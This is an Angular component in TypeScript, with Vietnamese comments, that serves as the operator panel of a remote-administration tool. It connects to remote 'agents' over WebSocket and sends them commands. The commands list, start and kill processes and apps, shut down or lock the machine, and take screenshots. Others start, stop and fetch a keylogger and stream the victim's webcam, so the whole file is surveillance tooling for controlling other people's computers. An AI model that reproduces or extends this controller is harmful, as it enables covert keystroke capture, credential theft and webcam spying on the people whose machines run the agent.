import { Component, signal, computed } from '@angular/core';
import { ActivatedRoute } from '@angular/router';
import { CommonModule, JsonPipe } from '@angular/common';

import { WebSocketService } from '../../services/websocket.service';

@Component({
  selector: 'app-agent-detail',
  standalone: true,
  imports: [CommonModule, JsonPipe],
  templateUrl: './agent-detail.html',
  styleUrls: ['./agent-detail.css']
})
export class AgentDetailComponent {

  selectedModule = signal<string | null>(null);

  processList = computed(() => this.ws.processList());
  appList = computed(() => this.ws.appList());
  keylogEntries = computed(() => this.ws.keylogList());
  screenshot = computed(() => this.ws.screenshotUrl());
  webcamFrame = computed(() => this.ws.webcamFrameUrl());

  rawJson = '';
  agent: any = null;
  loading = signal<boolean>(true);

  constructor(
    public ws: WebSocketService,
    private route: ActivatedRoute
  ) {}

  ngOnInit() {
    this.route.paramMap.subscribe(params => {
      const id = params.get("id");
      if (!id) {
        console.error("Không tìm thấy ID trong route.");
        return;
      }

      // 📌 Fetch agent từ Registry server
      this.fetchAgent(id);
    });
  }

  // ================================
  // FETCH AGENT
  // ================================
  fetchAgent(machineId: string) {
    this.loading.set(true);

    fetch(`http://localhost:3000/api/agents/${machineId}`)
      .then(r => r.json())
      .then(agent => {
        this.agent = agent;
      })
      .catch(err => {
        console.error("Lỗi load agent:", err);
      })
      .finally(() => {
        this.loading.set(false);
      });
  }

  // ================================
  // WEBSOCKET
  // ================================

  connectWS() {
    if (!this.agent) return;

    console.log("Connecting to WS:", this.agent.ip, this.agent.wsPort);
    this.ws.connect(this.agent.ip, this.agent.wsPort);
  }

  // ================================
  // MODULE UI
  // ================================

  backToModules() {
    this.selectedModule.set(null);
  }

  openModule(m: string) {
    this.selectedModule.set(m);
  }

  // ================================
  // RAW JSON
  // ================================
  sendRawJson() {
    try {
      const json = JSON.parse(this.rawJson);
      this.ws.sendJson(json);
    } catch {
      alert("JSON không hợp lệ!");
    }
  }

  // PROCESS
  sendProcessList() {
    this.ws.sendJson({ module: "PROCESS", command: "LIST" });
  }

  sendProcessKill() {
    const pid = prompt("Nhập PID cần kill:");
    if (pid) this.ws.sendJson({ module: "PROCESS", command: "KILL", pid: Number(pid) });
  }

sendProcessStart() {
  const exe = prompt("Nhập tên file .exe cần chạy:");
  if (exe) this.ws.sendJson({
    module: "PROCESS",
    command: "START",
    payload: { path: exe }
  });
}
killProcess(pid: number) {
  this.ws.sendJson({
    module: "PROCESS",
    command: "KILL",
    pid: pid
  });
}
  // SYSTEM
  sendSystemShutdown() {
    this.ws.sendJson({ module: "SYSTEM", command: "SHUTDOWN" });
  }

  sendSystemRestart() {
    this.ws.sendJson({ module: "SYSTEM", command: "RESTART" });
  }

  sendSystemLogoff() {
    this.ws.sendJson({ module: "SYSTEM", command: "LOGOFF" });
  }

  sendSystemLock() {
    this.ws.sendJson({ module: "SYSTEM", command: "LOCK" });
  }

  // SCREENSHOT
  sendScreenCaptureBinary() {
    this.ws.sendJson({ module: "SCREEN", command: "CAPTURE_BINARY" });
  }

  clearScreenshot() {
    this.ws.screenshotUrl.set(null);
  }

  // APP
  sendAppList() {
    this.ws.sendJson({ module: "APP", command: "LIST" });
  }

  sendAppStart() {
  const name = prompt("Nhập app cần mở:");
  if (name) this.ws.sendJson({
    module: "APP",
    command: "START",
    payload: { path: name }
  });
}
killApp(name: string) {
  this.ws.sendJson({
    module: "APP",
    command: "KILL",
    payload: { name: name }
  });
}
  // KEYLOGGER
  sendKeyloggerStart() {
    this.ws.sendJson({ module: "KEYBOARD", command: "START" });
  }

  sendKeyloggerStop() {
    this.ws.sendJson({ module: "KEYBOARD", command: "STOP" });
  }

  sendKeyloggerGetLog() {
    this.ws.sendJson({ module: "KEYBOARD", command: "GET_LOG" });
  }
clearKeylogs() {
  this.ws.keylogList.set([]);  // Xóa toàn bộ log trong signal
}
keylogString = computed(() => {
  return this.keylogEntries().map(k => k.text).join("");
});




  // WEBCAM
  sendWebcamStartStream() {
    this.ws.sendJson({ module: "WEBCAM", command: "START_STREAM" });
  }

  sendWebcamStopStream() {
    this.ws.sendJson({ module: "WEBCAM", command: "STOP_STREAM" });
  }
}
